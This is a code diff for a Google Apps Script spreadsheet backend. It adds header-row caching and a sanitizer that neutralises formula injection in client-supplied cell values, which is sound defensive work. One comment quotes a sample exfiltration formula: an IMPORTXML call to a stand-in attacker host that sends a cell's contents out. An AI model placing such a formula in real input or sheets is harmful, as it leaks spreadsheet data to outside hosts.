@@ -103,10 +103,52 @@ function writeChunkedCache_(cache, key, value, ttlSeconds) {
   cache.putAll(entries, ttlSeconds);
 }
 
+/**
+ * Per-execution cache of each sheet's header row. objectToSheetRow_/appendObjectToSheet_/
+ * updateSheetRow_ are all called once per RECORD from every sync/aggregation loop in this
+ * project (JiraSync, Aggregation, TicketProjectApi, InitiativesSync) — each call was re-reading
+ * the same header row from Sheets, doubling the Sheets API call volume of every one of those
+ * loops for no reason (found via a full-codebase performance audit; this project has hit Sheets/
+ * script-runtime quota exhaustion before, see Aggregation.gs's own historical-timeout comment).
+ * A plain top-level var is exactly the pattern getMetricsDailyIndex_/getRawTicketIndex_ already
+ * use for the equivalent row-lookup problem — it lives only for the current execution and is
+ * never persisted, so a header added by some OTHER function earlier in the same execution won't
+ * retroactively appear here; that's an accepted, narrow tradeoff since header-adding migrations
+ * in this project run as their own standalone one-off functions, never interleaved with a sync
+ * loop that also writes rows in the same execution.
+ */
+var HEADER_ROW_CACHE_ = {};
+
+function getSheetHeaders_(sheet) {
+  var id = sheet.getSheetId();
+  if (!HEADER_ROW_CACHE_[id]) {
+    HEADER_ROW_CACHE_[id] = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
+  }
+  return HEADER_ROW_CACHE_[id];
+}
+
+/**
+ * Blocks Google Sheets from interpreting a client-supplied string as a live formula. A value
+ * starting with =, +, -, or @ is prefixed with a literal apostrophe — the same character Sheets'
+ * own UI uses to force a cell to plain text — so e.g. a feedback/notes field containing
+ * '=IMPORTXML("https://evil.example/?d="&A1,"//a")' is stored and displayed as that literal
+ * string instead of executing. Found via a full-codebase security audit: every *Api.gs create/
+ * update route (IncidentsApi, LeaveApi, RtoApi, ProjectsApi, ProgressApi, TasksApi) writes
+ * client-supplied string fields straight into a row via these two functions with no check.
+ */
+function sanitizeSheetValue_(value) {
+  if (typeof value !== 'string' || !value.length) return value;
+  var first = value.charAt(0);
+  if (first === '=' || first === '+' || first === '-' || first === '@') {
+    return "'" + value;
+  }
+  return value;
+}
+
 /** Converts an object into a row array matching the sheet's current header order. */
 function objectToSheetRow_(sheet, obj) {
-  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
-  return headers.map((h) => (h in obj ? obj[h] : ''));
+  const headers = getSheetHeaders_(sheet);
+  return headers.map((h) => (h in obj ? sanitizeSheetValue_(obj[h]) : ''));
 }
 
 function appendObjectToSheet_(sheet, obj) {
@@ -115,8 +157,8 @@ function appendObjectToSheet_(sheet, obj) {
 
 /** Overwrites an existing row (1-indexed) with the given object's values. */
 function updateSheetRow_(sheet, rowIndex, obj) {
-  const headers = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
-  const row = headers.map((h) => (h in obj ? obj[h] : sheet.getRange(rowIndex, headers.indexOf(h) + 1).getValue()));
+  const headers = getSheetHeaders_(sheet);
+  const row = headers.map((h, i) => (h in obj ? sanitizeSheetValue_(obj[h]) : sheet.getRange(rowIndex, i + 1).getValue()));
   sheet.getRange(rowIndex, 1, 1, headers.length).setValues([row]);
 }
 
